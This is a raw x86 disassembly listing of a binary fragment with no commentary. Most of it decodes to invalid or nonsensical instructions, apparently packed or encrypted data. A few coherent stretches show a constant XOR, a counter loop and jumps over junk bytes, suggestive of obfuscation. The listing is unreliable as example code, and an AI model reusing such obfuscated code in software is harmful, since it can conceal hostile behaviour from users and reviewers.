  410e09:	bound  ebp,QWORD PTR [ebx+0x7e3ae4e7]
  410e0f:	into   
  410e10:	xchg   edi,eax
  410e11:	xor    BYTE PTR [ebx],0xa3
  410e14:	xchg   edx,eax
  410e15:	xchg   ebx,eax
  410e16:	fldcw  WORD PTR [eax-0xc4d6758]
  410e1c:	(bad)  
  410e1e:	(bad)  
  410e1f:	scas   al,BYTE PTR es:[edi]
  410e20:	loopne 0x410e21
  410e22:	sub    bl,BYTE PTR [ebp+0x1b]
  410e25:	sub    ecx,DWORD PTR [ebx+edi*1+0x5e]
  410e29:	es popf 
  410e2b:	jbe    0x410dae
  410e2d:	push   eax
  410e2e:	in     eax,0x2e
  410e30:	outs   dx,BYTE PTR ds:[esi]
  410e31:	cmp    BYTE PTR [edx],0x8e
  410e34:	mov    al,ds:0xedf7c997
  410e39:	data16 mov ds:0xc24bee33,al
  410e3f:	in     eax,0x1b
  410e41:	mov    bl,0xe7
  410e43:	arpl   WORD PTR [eax+eax*1],ax
  410e46:	(bad)  
  410e47:	mov    ds:0x332b570c,al
  410e4c:	add    DWORD PTR fs:[ebx-0xc1fad15],0x39df4105
  410e57:	push   cs
  410e58:	popf   
  410e59:	mov    ds:0x4d7faaa7,eax
  410e5e:	pop    es
  410e5f:	std    
  410e60:	xchg   ebx,eax
  410e61:	push   edi
  410e62:	daa    
  410e63:	ds mov eax,0x786ab10f
  410e69:	loopne 0x410e1d
  410e6b:	test   al,0x38
  410e6d:	mov    eax,0x1367874e
  410e72:	or     edx,DWORD PTR [ebp+eiz*1-0x28fd621]
  410e79:	sub    esp,DWORD PTR [ebx]
  410e7b:	or     al,BYTE PTR [ebx+0x3f]
  410e7e:	(bad)  
  410e7f:	push   ebx
  410e80:	sar    BYTE PTR [ebx],0x2d
  410e83:	mov    dl,0x49
  410e85:	adc    BYTE PTR [ecx],ah
  410e87:	mov    ah,0xc5
  410e89:	(bad)  
  410e8b:	cs daa 
  410e8d:	cmp    eax,0x542c6cc7
  410e92:	pop    eax
  410e93:	inc    esi
  410e94:	push   ds
  410e95:	aaa    
  410e96:	mov    ebx,0x29ff12f6
  410e9b:	addr16 mov esp,0x1ecb25e0
  410ea1:	popa   
  410ea2:	out    0xeb,al
  410ea4:	not    DWORD PTR [ecx-0x2dafa2af]
  410eaa:	fwait
  410eab:	push   ss
  410eac:	jp     0x410e40
  410eae:	pop    edi
  410eaf:	xor    ch,BYTE PTR [ebx-0x36]
  410eb2:	adc    BYTE PTR [edi-0x2e881b4a],0xcd
  410eb9:	std    
  410eba:	adc    bh,al
  410ebc:	sub    eax,0x7efc2213
  410ec1:	test   al,0x8
  410ec3:	imul   ebp,DWORD PTR [edx],0xffffffb7
  410ec6:	sbb    ch,dl
  410ec8:	xor    dl,BYTE PTR [edx-0x42cd03ef]
  410ece:	add    BYTE PTR [ebp+0x40],ah
  410ed1:	popf   
  410ed2:	out    0xb7,eax
  410ed4:	adc    al,BYTE PTR [edx]
  410ed6:	adc    eax,0x9695c38
  410edb:	jb     0x410eef
  410edd:	test   DWORD PTR [eax],edi
  410edf:	xchg   esi,eax
  410ee0:	dec    esi
  410ee1:	or     eax,0xb2e6f0bf
  410ee6:	pop    ds
  410ee7:	cs cld 
  410ee9:	out    dx,al
  410eea:	lock mov esp,0xa18a3917
  410ef0:	pusha  
  410ef1:	repnz xor eax,0x5915f674
  410ef7:	mov    bh,BYTE PTR [ecx+edx*2+0x1d1a59af]
  410efe:	inc    esi
  410eff:	sbb    BYTE PTR [edi],bl
  410f01:	or     esi,esi
  410f03:	fsubr  QWORD PTR ds:0xe6476845
  410f09:	jle    0x410e95
  410f0b:	pop    edx
  410f0c:	xor    DWORD PTR [eax-0x7d],0xffffffcb
  410f10:	pop    es
  410f11:	push   cs
  410f12:	or     DWORD PTR [ebx],0xb08688f2
  410f18:	dec    edx
  410f19:	push   eax
  410f1a:	mov    ebx,0x5fc3b62c
  410f1f:	adc    DWORD PTR [eax],eax
  410f21:	test   al,0xfd
  410f23:	sbb    esi,DWORD PTR [ecx-0x5b9d1335]
  410f29:	stos   BYTE PTR es:[edi],al
  410f2a:	dec    ebx
  410f2b:	lods   al,BYTE PTR ds:[esi]
  410f2c:	cdq    
  410f2d:	lods   eax,DWORD PTR ds:[esi]
  410f2e:	xchg   ebp,eax
  410f2f:	(bad)  
  410f30:	aas    
  410f31:	mov    ecx,0xd6f2e976
  410f36:	(bad)  
  410f37:	repnz inc ebp
  410f39:	lea    ecx,[ebx+esi*2]
  410f3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f3d:	(bad)  
  410f3e:	repnz pop edx
  410f40:	leave  
  410f41:	int3   
  410f42:	jmp    0x410f18
  410f44:	cmp    al,0x20
  410f46:	js     0x410f9c
  410f48:	and    al,0x32
  410f4a:	pusha  
  410f4b:	and    DWORD PTR [ebx+ecx*4+0x66309a8a],edx
  410f52:	mov    WORD PTR [eax-0x4d3954cc],cs
  410f58:	xor    al,0xc0
  410f5a:	adc    DWORD PTR [edx+0x1e],edx
  410f5d:	adc    ecx,DWORD PTR [eax]
  410f5f:	stos   DWORD PTR es:[edi],eax
  410f60:	into   
  410f61:	push   0x5ee12c
  410f66:	in     al,dx
  410f67:	dec    ebx
  410f68:	pop    edx
  410f69:	or     edx,DWORD PTR [edx+0x22]
  410f6c:	add    esi,DWORD PTR [ebp+0xbbf3279]
  410f72:	mov    ebx,0x108b29e4
  410f77:	pop    esp
  410f78:	in     eax,0xa
  410f7a:	pop    esi
  410f7b:	scas   eax,DWORD PTR es:[edi]
  410f7c:	push   ds
  410f7d:	cmp    edx,ebp
  410f7f:	out    dx,eax
  410f80:	rcl    DWORD PTR [ebx+0x5c],0x62
  410f84:	sub    DWORD PTR [ecx-0x52],0x8a95ddb1
  410f8b:	in     al,dx
  410f8c:	in     eax,dx
  410f8d:	dec    ebp
  410f8e:	adc    dh,BYTE PTR [esi+0x2f258aba]
  410f94:	outs   dx,DWORD PTR ds:[esi]
  410f95:	push   esi
  410f96:	jg     0x410ffb
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fdee,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e19c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x41cc5c44]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410f66
  410fdd:	mov    bh,0x56
  410fdf:	mov    eax,ds:0x8c6b5ec5
  410fe4:	add    BYTE PTR [eax+0x52454edb],dl
  410fea:	rcl    BYTE PTR [eax-0x35173551],1
  410ff0:	daa    
  410ff1:	jecxz  0x410fd7
  410ff3:	popf   
  410ff4:	jmp    DWORD PTR [ebp+0x2e]
  410ff7:	pop    ecx
  410ff8:	pusha  
  410ff9:	mov    ds:0x1fe1b277,al
  410ffe:	cmc    
  410fff:	push   ss
  411000:	cld    
  411001:	push   0x17420414
  411006:	daa    
  411007:	mov    eax,0xf997ce5d
  41100c:	gs mov ah,0xc1
  41100f:	xlat   BYTE PTR ds:[bx]
  411011:	pop    es
  411012:	leave  
  411013:	mov    bh,dh
  411015:	rol    BYTE PTR [edx-0x1e00ea8c],0x47
  41101c:	mov    al,ds:0xd03de3fa
  411021:	ds out 0x2,eax
  411024:	mov    ah,0x97
  411026:	add    eax,DWORD PTR [ecx]
  411028:	xchg   ebx,eax
  411029:	jmp    0xdc5a:0xb2e89727
  411030:	add    BYTE PTR [eax+0x4f],ch
  411033:	test   BYTE PTR [eax+0x8ee8d6d],cl
  411039:	sub    dl,BYTE PTR [eax+0x57db744b]
  41103f:	jae    0x411002
  411041:	dec    esp
  411042:	pop    edx
  411043:	add    al,0xe9
  411045:	ds mov edx,0xd239542c
  41104b:	mov    bl,0xb0
  41104d:	ins    DWORD PTR es:[edi],dx
  41104e:	aad    0x61
  411050:	cmp    esp,DWORD PTR [edx+0x4584b313]
  411056:	lods   eax,DWORD PTR ds:[esi]
  411057:	inc    esi
  411058:	add    DWORD PTR ds:0xc0914606,eax
  41105e:	aam    0xc6
  411060:	test   BYTE PTR [edx-0x43318e66],dh
  411066:	cmp    ch,bl
  411068:	cmp    DWORD PTR [edx+0x5cd76a70],eax
  41106e:	xchg   ecx,eax
  41106f:	shl    ah,0x5c
  411072:	mov    ecx,0x308537a1
  411077:	sub    ch,BYTE PTR [esi-0x3c]
  41107a:	ss cli 
  41107c:	sbb    eax,0x1a953632
  411081:	loope  0x41109b
  411083:	scas   al,BYTE PTR es:[edi]
  411084:	or     al,0x4b
  411086:	mov    ds:0xe072a374,eax
  41108b:	pop    edi
  41108c:	or     esp,DWORD PTR [edx+0x55]
  41108f:	fisub  DWORD PTR [esi+eiz*2+0x81d9877]
  411096:	out    0x50,al
  411098:	in     eax,dx
  411099:	and    eax,0xb82c30b3
  41109e:	sub    eax,0xb526ad76
  4110a3:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4110a5:	gs loop 0x4110e6
  4110a8:	mov    ebp,0x6093f950
  4110ad:	xor    al,BYTE PTR [edx+0x6c]
  4110b0:	(bad)  
  4110b1:	int3   
  4110b2:	jle    0x4110fc
  4110b4:	push   cs
  4110b5:	fdivr  st,st(6)
  4110b7:	(bad)  
  4110b8:	sbb    bl,dh
  4110ba:	jmp    DWORD PTR [ebx+0x51]
  4110bd:	cwde   
  4110be:	test   eax,0x793ed72b
  4110c3:	popf   
  4110c4:	aas    
  4110c5:	sahf   
  4110c6:	loope  0x4110b9
  4110c8:	adc    ch,cl
  4110ca:	jge    0x41113a
  4110cc:	jmp    0xd8546281
  4110d1:	(bad)  
  4110d2:	daa    
  4110d3:	inc    esp
  4110d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110d5:	cmc    
  4110d6:	hlt    
  4110d7:	mov    WORD PTR [ecx-0xe2fe3f],?
  4110dd:	xchg   edi,eax
  4110de:	add    al,0xda
  4110e0:	jmp    0x2a75b483
  4110e5:	and    al,0xa3
  4110e7:	dec    edx
  4110e8:	mov    WORD PTR [edi],fs
  4110ea:	sbb    al,0x4f
  4110ec:	js     0x4110ea
  4110ee:	jbe    0x4110c1
  4110f0:	fldcw  WORD PTR [edx]
  4110f2:	push   ecx
  4110f3:	les    edi,FWORD PTR [edi-0x7f]
  4110f6:	lods   eax,DWORD PTR ds:[esi]
  4110f7:	fist   DWORD PTR [ebx-0x5a4bec1f]
  4110fd:	in     eax,dx
  4110fe:	sub    BYTE PTR [ebx-0x6602ce53],0x47
  411105:	push   0x12846b7c
  41110a:	sub    ebp,0xffffffe9
  41110d:	test   DWORD PTR [esi-0x5e],esp
  411110:	sahf   
  411111:	lock int3 
  411113:	fiadd  DWORD PTR [edx]
  411115:	int    0xfd
  411117:	retf   0xcf9e
  41111a:	lds    eax,FWORD PTR [ecx]
  41111c:	fwait
  41111d:	js     0x411140
  41111f:	sbb    dl,BYTE PTR [ebp+eiz*2+0x51]
  411123:	mov    al,0xe5
  411125:	adc    ah,BYTE PTR [eax]
  411127:	xchg   edi,eax
  411128:	call   0x89a5:0x2deadbf6
  41112f:	push   edi
  411130:	(bad)
  411133:	and    eax,0x557b1913
  411138:	sti    
  411139:	rol    ecx,0x51
  41113c:	add    eax,0x108eced5
  411141:	sbb    BYTE PTR [edx-0x31],dl
  411144:	dec    ebp
  411145:	sbb    DWORD PTR ds:0x768b6083,0xfffffff8
  41114c:	and    ecx,DWORD PTR [edi+eax*1+0x7e5bed73]
  411153:	shr    bl,0x6e
  411156:	push   0xfffffffb
  411158:	int    0x55
  41115a:	mov    edx,0xc61e3951
  41115f:	or     bl,BYTE PTR [edi+0x51b8a899]
  411165:	xchg   ebx,eax
  411166:	inc    esi
  411167:	in     eax,dx
  411168:	inc    esp
  411169:	js     0x411178
  41116b:	lods   eax,DWORD PTR ds:[esi]
  41116c:	add    BYTE PTR [edx+eax*2+0x6564571e],ch
  411173:	jae    0x411177
  411175:	mov    ebp,0x24fb243a
  41117a:	push   0x8e06b95d
  41117f:	clc    
  411180:	jnp    0x411195
  411182:	sar    BYTE PTR [esi],cl
  411184:	xchg   cl,ah
  411186:	ins    BYTE PTR es:[edi],dx
  411187:	test   BYTE PTR [edx+0x6d78613a],bh
  41118d:	bound  ebp,QWORD PTR [edi]
  41118f:	mov    ds:0x62b7510,eax
  411194:	pop    esp
  411195:	mov    ebx,DWORD PTR [ecx+0x21]
  411198:	imul   esp
  41119a:	loop   0x4111b9
  41119c:	aad    0xdc
  41119e:	dec    edi
  41119f:	adc    eax,0xd9eacfda
  4111a4:	sbb    esp,eax
  4111a6:	jle    0x4111f3
  4111a8:	xor    eax,0xb0433eb3
  4111ad:	test   al,0xaf
  4111af:	mov    ebx,0xf7e82d8
  4111b4:	pop    edx
  4111b5:	and    edx,DWORD PTR [ecx]
  4111b7:	push   edi
  4111b8:	es sbb eax,0x7d8cffa3
  4111be:	pushf  
  4111bf:	shr    BYTE PTR [ecx-0x40],0xaa
  4111c3:	mov    ds:0x570420e5,al
  4111c8:	dec    eax
  4111c9:	ja     0x4111aa
  4111cb:	dec    ecx
  4111cc:	inc    ebx
  4111cd:	(bad)  
  4111ce:	adc    eax,0x5b22a626
  4111d3:	xor    BYTE PTR [ebx-0x315b7fa8],bl
  4111d9:	fldcw  WORD PTR [ecx+0x70f7a8d7]
  4111df:	popa   
  4111e0:	mov    ebx,DWORD PTR [esi-0x3f1d0b9b]
  4111e6:	ret    
  4111e7:	sar    BYTE PTR [ebp-0x26],cl
  4111ea:	pusha  
  4111eb:	sub    BYTE PTR [edx+0x4bd2dfe2],cl
  4111f1:	popa   
  4111f2:	add    BYTE PTR [edi-0x5b719227],ch
  4111f8:	hlt    
  4111f9:	enter  0xc63f,0xe3
  4111fd:	or     DWORD PTR [edi-0x2b5d6eac],ebp
  411203:	mov    ecx,esi
  411205:	les    ebx,FWORD PTR [esp+eiz*8-0x7c]
  411209:	mov    ah,0x4d
  41120b:	and    BYTE PTR [edx],ah
  41120d:	and    cl,BYTE PTR [esi-0x74]
  411210:	xchg   esi,eax
  411211:	dec    esp
  411212:	shl    DWORD PTR [ecx-0x7d],1
  411215:	data16 fucomi st,st(0)
  411218:	bound  edi,QWORD PTR [esi-0x12]
  41121b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41121c:	add    esi,DWORD PTR [ebx-0x76]
  41121f:	je     0x4111bf
  411221:	and    ecx,esp
  411223:	push   0x8967cca6
  411228:	sbb    eax,eax
  41122a:	jnp    0x4111e7
  41122c:	stos   DWORD PTR es:[edi],eax
  41122d:	mov    ds:0xc0dc311d,eax
  411232:	mov    cs,eax
  411234:	dec    ecx
  411235:	add    dl,ah
  411237:	data16 mov al,ds:0x26ec7a67
  41123d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41123e:	dec    eax
  41123f:	xor    DWORD PTR [ebx+esi*1],0xffffffcf
  411243:	cdq    
  411244:	jmp    FWORD PTR ds:0x2ad926d4
  41124a:	inc    ebx
  41124b:	and    esi,ebx
  41124d:	mov    esi,0x78cad835
  411252:	in     al,0xf9
  411254:	adc    DWORD PTR [esi+0x7e4d2c6a],0x1e
  41125b:	pop    esp
  41125c:	and    al,0x7a
  41125e:	mov    DWORD PTR [edi+0x2e],edi
  411261:	js     0x411238
  411263:	test   al,0x4d
  411265:	ins    DWORD PTR es:[edi],dx
  411266:	lea    esp,[edi+0x44]
  411269:	dec    esp
  41126a:	es or  al,0xfb
  41126d:	xor    BYTE PTR ss:[edx-0x80],al
  411271:	sbb    BYTE PTR [ebp-0x22],bl
  411274:	push   esi
  411275:	pop    ss
  411276:	xchg   ebp,eax
  411277:	xor    esp,ecx
  411279:	lahf   
  41127a:	sbb    ch,dh
  41127c:	neg    edx
  41127e:	xchg   esp,eax
  41127f:	je     0x411293
  411281:	pop    ecx
  411282:	shl    DWORD PTR [ecx-0x27],cl
  411285:	daa    
  411286:	adc    edx,DWORD PTR [ebx]
  411288:	add    BYTE PTR [bp+di-0xa74],cl
  41128d:	cmp    DWORD PTR [edx],0xbd397065
  411293:	pop    ecx
  411294:	push   edx
  411295:	cmp    al,0x36
  411297:	(bad)  
  411299:	sti    
  41129a:	repnz in eax,0x29
  41129d:	and    DWORD PTR [esi+0x1ebec7b],0x46
  4112a4:	jl     0x411263
  4112a6:	mul    DWORD PTR [edx]
  4112a8:	loop   0x4112c2
  4112aa:	repz into 
  4112ac:	outs   dx,DWORD PTR ds:[esi]
  4112ad:	push   es
  4112ae:	in     al,dx
  4112af:	pop    es
  4112b0:	rcl    esp,0x90
  4112b3:	mov    bh,BYTE PTR [ecx-0x13f602b5]
  4112b9:	cmp    al,0x5c
  4112bb:	and    DWORD PTR [esi-0x5c],edi
  4112be:	jb     0x4112ea
  4112c0:	in     al,0x49
  4112c2:	ins    DWORD PTR es:[edi],dx
  4112c3:	pop    ebx
  4112c4:	aaa    
  4112c5:	dec    DWORD PTR [edx+edi*2+0x30]
  4112c9:	xchg   BYTE PTR [edx+ebp*1],bh
  4112cc:	and    eax,0x64f550b6
  4112d1:	xor    BYTE PTR ds:0x708cdd06,dh
  4112d7:	shl    BYTE PTR [ebx],0x5b
  4112da:	gs pop ebx
  4112dc:	sub    BYTE PTR [ebp-0x27adc7ac],ch
  4112e2:	mov    al,ds:0x94bc5cac
  4112e7:	lock stos BYTE PTR es:[edi],al
  4112e9:	arpl   WORD PTR [edi-0x3f380e],si
  4112ef:	test   BYTE PTR [eax-0x2f],ah
  4112f2:	cmc    
  4112f3:	or     al,0xb8
  4112f5:	enter  0x992f,0xc5
  4112f9:	(bad)  
  4112fa:	push   edi
  4112fb:	dec    edx
  4112fc:	sbb    DWORD PTR [eax],esp
  4112fe:	(bad)  
  4112ff:	cmc    
  411300:	lea    ebx,[ebx-0x71]
  411303:	jno    0x411329
  411305:	push   ebp
  411306:	pop    esp
  411307:	mov    ebp,0x51c6c7f1
  41130c:	mov    esi,0x4d2cd959
  411311:	popf   
  411312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411313:	test   eax,0x37ce77c4
  411318:	push   ds
  411319:	push   es
  41131a:	or     al,0xd1
  41131c:	leave  
  41131d:	aaa    
  41131e:	mov    fs,WORD PTR [edi-0x3e]
  411321:	stos   BYTE PTR es:[edi],al
  411322:	adc    DWORD PTR [edi-0xfdd9db2],0x6d
  411329:	jno    0x4112b0
  41132b:	ret    0xd25c
  41132e:	inc    esi
  41132f:	mov    ah,0x8a
  411331:	mov    dl,0xaf
  411333:	mov    ds:0x8fd6bf7d,al
  411338:	sub    ah,BYTE PTR [ecx+0x7d]
  41133b:	sbb    BYTE PTR [edx],0x77
  41133e:	stos   DWORD PTR es:[edi],eax
  41133f:	frstor [edx+0x61]
  411342:	popf   
  411343:	adc    eax,0xbebffb4b
  411348:	int3   
  411349:	dec    esi
  41134a:	fld    st(6)
  41134c:	aas    
  41134d:	adc    eax,0xd55c34d8
  411352:	ficom  WORD PTR [esi-0x33ae9a2b]
  411358:	jno    0x4112f5
  41135a:	(bad)  
  41135b:	aad    0x4
  41135d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41135e:	push   0xb6b640bb
  411363:	out    dx,al
  411364:	add    DWORD PTR [edx+eax*1+0x43dd8980],ecx
  41136b:	or     ebp,DWORD PTR [eax+eax*8+0x6a819363]
  411372:	mov    eax,ds:0x44181170
  411377:	mov    BYTE PTR [ecx-0x17],bl
  41137a:	pop    esi
  41137b:	jo     0x4113c8
  41137d:	or     al,0x22
  41137f:	fld    DWORD PTR [eax]
  411381:	jb     0x4113ef
  411383:	lahf   
  411384:	jle    0x411360
  411386:	out    dx,eax
  411387:	sbb    al,0x1e
  411389:	push   esi
  41138a:	cmp    dl,BYTE PTR [ebp-0x20]
  41138d:	inc    edx
  41138e:	stos   DWORD PTR es:[edi],eax
  41138f:	call   DWORD PTR [eax]
  411391:	push   0x25
  411393:	adc    DWORD PTR [esi-0x70],ecx
  411396:	inc    edx
  411397:	test   edx,ebx
  411399:	pop    edx
  41139a:	jno    0x4113a4
  41139c:	xlat   BYTE PTR cs:[ebx]
  41139e:	jg     0x411346
  4113a0:	out    dx,al
  4113a1:	mov    al,ds:0xa16b3702
  4113a6:	push   ds
  4113a7:	mov    WORD PTR ds:0xd2b57a39,cs
  4113ad:	sbb    BYTE PTR [eax-0x1b],bl
  4113b0:	inc    esi
  4113b1:	icebp  
  4113b2:	pop    ds
  4113b3:	push   edi
  4113b4:	mov    dl,0x54
  4113b6:	lods   eax,DWORD PTR ds:[esi]
  4113b7:	mov    ebp,0x116e3521
  4113bc:	jb     0x411370
  4113be:	xor    eax,0x5999d725
  4113c3:	sti    
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fd71,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fdfa,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fdfa
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fdfa,esi
  4113f2:	cmp    DWORD PTR ds:0x42fdfa,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e267
  411404:	push   0x42e2ed
  411409:	call   DWORD PTR ds:0x42e5e7
  41140f:	cmp    DWORD PTR ds:0x42fdfa,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fdfa
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fdfa,esi
  411429:	cmp    DWORD PTR ds:0x42fdfa,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	xchg   esi,eax
  411448:	cmp    al,dl
  41144a:	or     eax,0x70704a0e
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x4114a8
  411454:	mov    cl,0x71
  411456:	pushf  
  411457:	or     DWORD PTR [edx-0x5a99983],ebx
  41145d:	sbb    ebx,ebp
  41145f:	out    dx,al
  411460:	ret    0x8a63
  411463:	mov    ds:0xbcf975a2,eax
  411468:	call   0x7cbb3ef3
  41146d:	hlt    
  41146e:	dec    ebp
  41146f:	adc    edx,DWORD PTR [edx-0x614bddb0]
  411475:	lahf   
  411476:	push   ss
  411477:	jl     0x411426
  411479:	retf   0x4513
  41147c:	jle    0x41141a
  41147e:	or     eax,0xd8e08e84
  411483:	mov    ds:0xc23f35a8,al
  411488:	ficom  WORD PTR [esi]
  41148a:	xchg   edi,eax
  41148b:	(bad)  
  41148d:	test   BYTE PTR [ebp+0x21],bl
  411490:	mov    bh,0xc1
  411492:	sbb    edi,ebx
  411494:	mov    dh,0x9c
  411496:	fdivr  DWORD PTR [edx-0x55]
  411499:	aaa    
  41149a:	mov    bl,0x43
  41149c:	mov    ds:0xedeb5870,al
  4114a1:	loop   0x41146b
  4114a3:	xor    eax,0x80256a0b
  4114a8:	pop    ebx
  4114a9:	into   
  4114aa:	cld    
  4114ab:	xor    DWORD PTR [edi-0x2c],edx
  4114ae:	pop    esp
  4114af:	lahf   
  4114b0:	mov    ds:0xaa95d189,eax
  4114b5:	or     BYTE PTR [ecx+0x52],ah
  4114b8:	cli    
  4114b9:	push   esp
  4114ba:	add    BYTE PTR ds:0x29deab0c,dl
  4114c0:	pop    ebp
  4114c1:	ficom  DWORD PTR [eax-0x40]
  4114c4:	xchg   ecx,eax
  4114c5:	(bad)  
  4114c7:	pop    eax
  4114c8:	loope  0x41144f
  4114ca:	mov    cl,0xb5
  4114cc:	aas    
  4114cd:	and    BYTE PTR [eiz*1-0x9d545f2],ah
  4114d4:	mov    cl,0xb4
  4114d6:	sti    
  4114d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114d8:	jne    0x411472
  4114da:	dec    esp
  4114db:	call   0xc18d:0xf45f155e
  4114e2:	aas    
  4114e3:	mov    ebx,0xa03b5847
  4114e8:	jno    0x411545
  4114ea:	test   BYTE PTR [edx],0xfa
  4114ed:	xchg   esi,eax
  4114ee:	sbb    eax,ebx
  4114f0:	add    al,0xb6
  4114f2:	jmp    0xfbac7938
  4114f7:	mov    ebx,0x12e7a38e
  4114fc:	mov    ah,ah
  4114fe:	int3   
  4114ff:	scas   al,BYTE PTR es:[edi]
  411500:	sub    esp,esi
  411502:	loop   0x41157c
  411504:	push   ebp
  411505:	aad    0xa5
  411507:	jae    0x4114b4
  411509:	aas    
  41150a:	or     edx,DWORD PTR [esp+edx*2]
  41150d:	dec    esi
  41150e:	iret   
  41150f:	and    BYTE PTR [ebx-0x57],bl
  411512:	icebp  
  411513:	jp     0x41151d
  411515:	add    DWORD PTR [eax+0x4f],esi
  411518:	mov    dl,0x82
  41151a:	jecxz  0x4114da
  41151c:	pop    ds
  41151d:	inc    ecx
  41151e:	daa    
  41151f:	fincstp 
  411521:	add    edx,esp
  411523:	and    eax,0xf54ffdb3
  411528:	xor    DWORD PTR [esi+esi*1-0x2433686f],ecx
  41152f:	pop    edi
  411530:	xor    eax,0xfc120b95
  411535:	test   BYTE PTR [ebp+0x33],dh
  411538:	loopne 0x411554
  41153a:	or     al,0xfb
  41153c:	and    eax,DWORD PTR [ecx]
  41153e:	(bad)  
  41153f:	lahf   
  411540:	mov    esi,0xf769833c
  411545:	inc    ecx
  411546:	test   eax,0xbbdfc7b4
  41154b:	mov    dl,0xc9
  41154d:	jnp    0x4115c0
  41154f:	daa    
  411550:	inc    ebx
  411551:	fst    QWORD PTR [eax+0x3a]
  411554:	adc    dl,ah
  411556:	das    
  411557:	popf   
  411558:	mov    ch,0x24
  41155a:	les    edx,FWORD PTR [ebx+0x62]
  41155d:	stos   DWORD PTR es:[edi],eax
  41155e:	(bad)
  411562:	test   BYTE PTR [edi+esi*8-0x12],ch
  411566:	sub    DWORD PTR [edx+0x436440d1],eax
  41156c:	and    DWORD PTR [esi+0xb2d28a],ecx
  411572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411573:	cs aad 0x7a
  411576:	clc    
  411577:	mov    eax,ds:0x43451910
  41157c:	and    eax,0xd2a4570f
  411581:	push   ebx
  411582:	aad    0x64
  411584:	jne    0x411559
  411586:	shl    DWORD PTR [eax-0x1ce22a5d],cl
  41158c:	popa   
  41158d:	or     al,0xe6
  41158f:	cmc    
  411590:	pop    es
  411591:	fwait
  411592:	outs   dx,BYTE PTR ds:[esi]
  411593:	jg     0x4115b2
  411595:	sub    esi,DWORD PTR [edx+edi*8]
  411598:	pop    eax
  411599:	mov    cl,dl
  41159b:	lods   al,BYTE PTR ds:[esi]
  41159c:	retf   0x8a11
  41159f:	mov    edi,0xff6f6d9b
  4115a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a5:	xchg   ebp,eax
  4115a6:	xchg   edi,eax
  4115a7:	repnz rol ebp,1
  4115aa:	fs es iret 
  4115ad:	lock cdq 
  4115af:	jae    0x411564
  4115b1:	fsubr  DWORD PTR [ebx+0x65]
  4115b4:	mov    ecx,0xabd4526e
  4115b9:	pop    edi
  4115ba:	xor    edx,DWORD PTR [esi-0x26]
  4115bd:	imul   eax,DWORD PTR [edi-0x7b],0x72ced8c7
  4115c4:	aam    0x5f
  4115c6:	jecxz  0x411581
  4115c8:	add    eax,0x27a2e2ca
  4115cd:	fdivr  QWORD PTR [eax+esi*4]
  4115d0:	pop    ebp
  4115d1:	test   DWORD PTR [edi+0x41],0x7d3d5718
  4115d8:	push   ebx
  4115d9:	jmp    0x8ced:0x5511d5f9
  4115e0:	mov    ch,0xdf
  4115e2:	inc    ebx
  4115e3:	pop    ebp
  4115e4:	add    cl,0x58
  4115e7:	or     al,0x33
  4115e9:	sbb    DWORD PTR [edx+eax*1],0xffffffa2
  4115ed:	mov    WORD PTR [edx-0x63],fs
  4115f0:	mov    al,0x16
  4115f2:	pop    esi
  4115f3:	cmp    esp,DWORD PTR [edx]
  4115f5:	jl     0x4115c3
  4115f7:	psraw  mm1,mm0
  4115fa:	jnp    0x4115b8
  4115fc:	call   0x4637:0x5500bb52
  411603:	and    al,dl
  411605:	retf   0x6eba
  411608:	ja     0x411596
  41160a:	popa   
  41160b:	mov    ebx,0xf4c50d70
  411610:	mov    ah,0xc1
  411612:	outs   dx,BYTE PTR ds:[esi]
  411613:	push   esi
  411614:	fimul  WORD PTR [edi]
  411616:	jle    0x4115b7
  411618:	pop    eax
  411619:	addr16 dec ebx
  41161b:	je     0x41164f
  41161d:	rcr    ah,0xae
  411620:	repnz xchg ebp,eax
  411622:	fcomp  DWORD PTR [eax]
  411624:	mov    dh,BYTE PTR [esi+0x564eb07f]
  41162a:	pop    esp
  41162b:	icebp  
  41162c:	outs   dx,DWORD PTR ds:[esi]
  41162d:	lock out 0xd1,al
  411630:	sbb    bl,BYTE PTR [ebx+esi*8]
  411633:	or     eax,0x2418ddbc
  411638:	(bad)  
  411639:	xchg   edi,eax
  41163a:	sub    edx,DWORD PTR [esi+0x66]
  41163d:	jle    0x411668
  41163f:	pop    edi
  411640:	pop    es
  411641:	cmp    al,0x4e
  411643:	push   ebp
  411644:	fidiv  WORD PTR [ebx]
  411646:	dec    ecx
  411647:	out    0xed,al
  411649:	pop    es
  41164a:	xor    eax,0xc42f29c8
